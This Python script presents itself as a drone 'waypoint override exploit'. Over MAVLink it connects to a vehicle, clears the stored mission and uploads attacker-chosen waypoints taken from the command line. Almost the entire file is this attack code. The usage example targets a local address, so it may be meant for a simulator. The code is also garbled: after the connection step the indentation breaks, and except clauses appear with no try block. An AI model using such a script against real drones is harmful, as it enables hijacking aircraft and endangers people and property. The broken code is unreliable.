#!/usr/bin/env python3
"""
Waypoint Override Exploit Script
Injects malicious waypoints into drone mission
"""

import sys
import time
from pymavlink import mavutil

def inject_waypoints(connection_string: str, waypoints: list):
    """
    Inject waypoints into drone mission
    
    Args:
        connection_string: MAVLink connection string
        waypoints: List of (lat, lon, alt) tuples
    """
    # Use helper function for connection
    import sys
    from pathlib import Path
    sys.path.insert(0, str(Path(__file__).parent.parent / 'utils'))
    from mavlink_helper import connect_to_drone
    
    print(f"[*] Connecting to {connection_string}...")
    master = connect_to_drone(connection_string, timeout=5)
    if master is None:
        return False
    print("[+] Connected to vehicle")
        
        target_system = master.target_system
        target_component = master.target_component
        
        # Clear existing mission
        print("[*] Clearing existing mission...")
        master.mav.mission_clear_all_send(target_system, target_component)
        time.sleep(1)
        
        # Send waypoint count
        print(f"[*] Uploading {len(waypoints)} waypoints...")
        master.mav.mission_count_send(target_system, target_component, len(waypoints))
        
        # Wait for request
        while True:
            msg = master.recv_match(type=['MISSION_REQUEST', 'MISSION_ACK'], blocking=True, timeout=2)
            if msg is None:
                break
            
            if msg.get_type() == 'MISSION_REQUEST':
                seq = msg.seq
                if seq < len(waypoints):
                    lat, lon, alt = waypoints[seq]
                    print(f"[*] Sending waypoint {seq}: lat={lat}, lon={lon}, alt={alt}m")
                    
                    master.mav.mission_item_send(
                        target_system,
                        target_component,
                        seq,
                        mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT,
                        mavutil.mavlink.MAV_CMD_NAV_WAYPOINT,
                        0, 1 if seq == 0 else 0, 1, 0, 0, 0,
                        lat, lon, alt
                    )
                else:
                    break
            elif msg.get_type() == 'MISSION_ACK':
                if msg.type == mavutil.mavlink.MAV_MISSION_ACCEPTED:
                    print("[+] Mission uploaded successfully")
                else:
                    print(f"[-] Mission upload failed: {msg.type}")
                break
        
        return True
        
    except (ConnectionError, OSError) as e:
        print(f"[-] Connection error: {e}")
        return False
    except TimeoutError as e:
        print(f"[-] Timeout waiting for mission acknowledgment: {e}")
        return False
    except Exception as e:
        print(f"[-] Error injecting waypoints: {e}")
        return False

def main():
    if len(sys.argv) < 4:
        print("Usage: python3 waypoint_override.py <connection> <lat1> <lon1> <alt1> [lat2 lon2 alt2 ...]")
        print("Example: python3 waypoint_override.py udp:127.0.0.1:14550 37.0 -122.0 50 38.0 -123.0 100")
        sys.exit(1)
    
    connection = sys.argv[1]
    waypoints = []
    
    # Parse and validate waypoints (groups of 3: lat, lon, alt)
    for i in range(2, len(sys.argv), 3):
        if i + 2 < len(sys.argv):
            try:
                lat = float(sys.argv[i])
                if not -90 <= lat <= 90:
                    raise ValueError(f"Latitude {lat} must be between -90 and 90 degrees")
                
                lon = float(sys.argv[i + 1])
                if not -180 <= lon <= 180:
                    raise ValueError(f"Longitude {lon} must be between -180 and 180 degrees")
                
                alt = float(sys.argv[i + 2])
                if not -500 <= alt <= 50000:
                    raise ValueError(f"Altitude {alt} must be between -500 and 50000 meters")
                
                waypoints.append((lat, lon, alt))
            except (ValueError, IndexError) as e:
                print(f"[-] Invalid waypoint at position {i}: {e}")
                sys.exit(1)
    
    if not waypoints:
        print("[-] No waypoints provided")
        sys.exit(1)
    
    success = inject_waypoints(connection, waypoints)
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()
